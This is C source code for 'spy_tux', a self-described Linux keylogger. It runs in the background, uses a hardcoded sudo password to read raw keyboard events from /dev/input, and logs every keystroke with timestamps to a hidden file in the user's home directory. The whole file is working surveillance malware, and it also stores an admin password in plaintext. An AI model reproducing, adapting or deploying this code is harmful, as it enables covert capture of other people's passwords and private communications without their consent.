/*
*Author :Tharindra Galahena
*Project:spy_tux - keylogger for linux
*Date   :29/07/2012
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/input.h>
#include <pthread.h>
#include <signal.h>
#include <string.h>
#include <sys/wait.h>

//the path of your event file for the keybord. most probably it is the same a this  
#define	event_path "/dev/input/event3"  
#define pass_word  "god created a1pha and 0mega"				//admin password of the computer
#define data_file  "/home/tharindra/.data" 	//path of the .data file
#define keys_file  "/home/tharindra/.keys" 	//path of the .keys file

char keys[242][20];
FILE *data;
pthread_mutex_t mutex;

void print_stamp(){
	time_t now;
	char *ti = (char *)malloc(100);
		
	time(&now);
	strcpy(ti, (char *)ctime(&now));
	ti[strlen(ti) - 1] = '\0';
	pthread_mutex_lock(&mutex);
	fprintf(data, "\n%s : ", ti);
	fflush(data);
	pthread_mutex_unlock(&mutex);
	
	free(ti);
}
void signal_heandle(){
	print_stamp();
	fprintf(data, "-------------------end------------------------\n");
	fclose(data);
	exit(0);
}
void read_file(){
	FILE *kf = fopen(keys_file, "r");
	if(kf == NULL){ 
		print_stamp();
		fprintf(data, "ERROR : keys file missing\n");
		exit(0);
	}
	char line[40];
	int i;
	for(i = 0; fgets(line, 30, kf) > 0 && i < 242; i++){
		line[strlen(line) - 1] = '\0';
		strcpy(keys[i], line);
	}
	fclose(kf);
}
void *th(void *arg){
	while(1){
		print_stamp();
		sleep(30);
	}
}
void keylog_init(){
	int pfds[2];
	int pfds2[2];
	
	data = fopen(data_file, "a+");
    
    if(pipe(pfds) == -1){
		print_stamp();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if(pipe(pfds2) == -1){
		print_stamp();
		fprintf(data, "ERROR : pipe error\n");
		exit(0);
	}
	if (!fork()) {
		if (!fork()){
			close(1); 
			dup(pfds2[1]);  
			close(pfds2[0]);
			execlp("echo", "echo", pass_word, NULL);
		}else{
			wait(NULL);
			close(0);
			dup(pfds2[0]); 
			close(1); 
			dup(pfds[1]);  
			
			close(pfds[0]); 
			close(pfds2[1]); 
			execlp("sudo", "sudo", "-S", "cat", event_path, NULL);
		}
        
    }else{
		
		pthread_t pth;
		struct input_event *in;
		char *buff;
		
		pthread_mutex_init(&mutex, NULL);
		print_stamp();
		fprintf(data, "------------------start-----------------------\n");
		fflush(data); 
		read_file();
		pthread_create(&pth, NULL, th, NULL);
        
        while (1){
			buff = (char *)malloc(sizeof(struct input_event) * 64);    
			 
			read (pfds[0], buff, sizeof(struct input_event) * 64);     
			read (pfds[0], buff, sizeof(struct input_event) * 64);
			
			in = (struct input_event *)buff;
			
			if(in -> value < 241) {
				pthread_mutex_lock(&mutex);
				fprintf(data, "%s ", keys[in -> value]);
				fflush(data);
				pthread_mutex_unlock(&mutex);
			}
			free(buff);
        }
    }
	fflush(data);
}
int main(void){
	
	if(!fork()){
		signal(SIGINT | SIGPWR, signal_heandle);
		keylog_init();
	}else{
		printf("\n---spy_tux started!---\n");
	}
    return 0;
}

